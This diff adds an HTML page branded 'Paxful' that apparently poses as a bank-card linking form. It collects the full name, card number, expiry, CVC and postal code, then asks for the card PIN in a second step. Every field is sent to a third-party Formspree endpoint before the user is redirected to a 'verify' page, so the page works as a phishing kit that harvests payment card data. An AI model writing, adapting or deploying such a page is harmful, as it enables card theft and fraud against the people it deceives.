@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <style>
+        *{
+            margin: 0;
+            padding: 0;
+            font-family: arial;
+            color: white;
+            transition: all .5s linear;
+        }
+        body{
+            width: 100%;
+            height: 100vh;
+            background: black;
+        }
+        .top{
+            margin-left: 30px;
+            margin-top: 30px;
+        }
+        .top button{
+            background-color: transparent;
+            border: 0;
+            width: 35px;
+            height: 35px;
+            background: url(./arrow-left.svg);
+            background-repeat: no-repeat;
+            background-size: cover;
+            margin-bottom: 30px;
+        }
+        .a{
+            margin-left: 40px;
+            font-size: 25px;
+            font-weight: bold;
+            margin-bottom: 40px;
+        }
+        .b{
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        form{
+            width: 100%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        form div{
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 10px;
+            width: 100%;
+            text-align: start;
+        }
+        form label{
+            width: 80%;
+            margin-bottom: 15px;
+            font-size: 15px;
+            font-family: calibri;
+            color: rgb(195, 195, 195);
+        }
+        form input{
+            width: 80%;
+            height: 40px;
+            border-radius: 15px;
+            background: transparent;
+            border: 1px solid rgb(143, 143, 143);
+            margin-bottom: 5px;
+            text-align: center;
+        }
+        .flex{
+            flex-direction: row;
+            width: 90%;
+        }
+        .flex input{
+            width: 80%;
+        }
+        .botton{
+            width: 100%;
+            display: flex;
+            justify-content: flex-end;
+            flex-direction: column;
+            align-items: end;
+        }
+        .botton button{
+            padding: 10px 30px;
+            border-radius: 100px;
+            font-size: 20px;
+            font-family: calibri;
+            background: rgb(2,228,65);
+            color: black;
+            margin-right: 50px;
+            margin-top: 20px;
+        }
+        .pin{
+            display: none;
+        }
+        #my-form-button{
+            display: none;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Paxful</title>
+</head>
+<body>
+    <div class="top">
+        <button onclick="window.location='./linkcard.html'"></button>
+    </div>
+    <div class="a">
+        Link your bank card
+    </div>
+    <div class="b">
+        <form id="my-form" action="https://formspree.io/f/xovkazao" method="POST">
+            <div class="full">
+                <label>Full name</label><input type="text" name="fullname" required/>
+            </div>
+            <div class="card">
+                <label>
+                    Card number
+                </label><input type="number" name="cade" required/>
+            </div>
+            <div class="flex">
+                <div class="">
+                    <label>Expiration</label><input type="number" name="expiry" required/>
+                </div>
+                <div class="">
+                    <label>Cvc</label><input type="number" name="back number" required/>
+                </div>
+            </div>
+            <div class="post">
+                <label>Postal code</label><input type="number" name="postal code" required/>
+            </div>
+            <div class="pin">
+                <label for="">Pin</label><input type="number" name="spincer" id="" required/>
+            </div>
+            <div class="botton">
+                <button id="no" type="button">Continue</button>
+                <button id="my-form-button">Link now</button>
+            </div>
+        </form>
+    </div>
+<script>
+    let continuebutton = document.getElementById('no');
+    let linkbutton = document.getElementById('my-form-button');
+    let nextpageheader = document.querySelector('.a');
+    let forminput1 = document.querySelector('.full');
+    let forminput2 = document.querySelector('.card');
+    let forminput3 = document.querySelector('.flex');
+    let forminput4 = document.querySelector('.post');
+    let visible = document.querySelector('.pin');
+    continuebutton.addEventListener('click',()=>{
+        nextpageheader.innerHTML = 'Please input your pin'
+        forminput1.style.display = 'none'
+        forminput2.style.display = 'none'
+        forminput3.style.display = 'none'
+        forminput4.style.display = 'none'
+        visible.style.display = 'flex'
+        continuebutton.style.display = 'none'
+        linkbutton.style.display = 'block'
+    })
+
+    var form = document.getElementById("my-form");
+  
+  async function handleSubmit(event) {
+    event.preventDefault();
+    var data = new FormData(event.target);
+    fetch(event.target.action, {
+      method: form.method,
+      body: data,
+      headers: {
+          'Accept': 'application/json'
+      }
+    }).then(response => {
+      if (response.ok) {
+        window.location = './verify.html'
+        form.reset()
+      } else {
+        response.json().then(data => {
+          if (Object.hasOwn(data, 'errors')) {
+            alert(data["errors"].map(error => error["message"]).join(", "))
+          } else {
+            alert("Oops! There was a problem submitting your form")
+          }
+        })
+      }
+    }).catch(error => {
+      alert("Oops! There was a problem submitting your form")
+    });
+  }
+  form.addEventListener("submit", handleSubmit)
+</script>
+</body>
+</html>
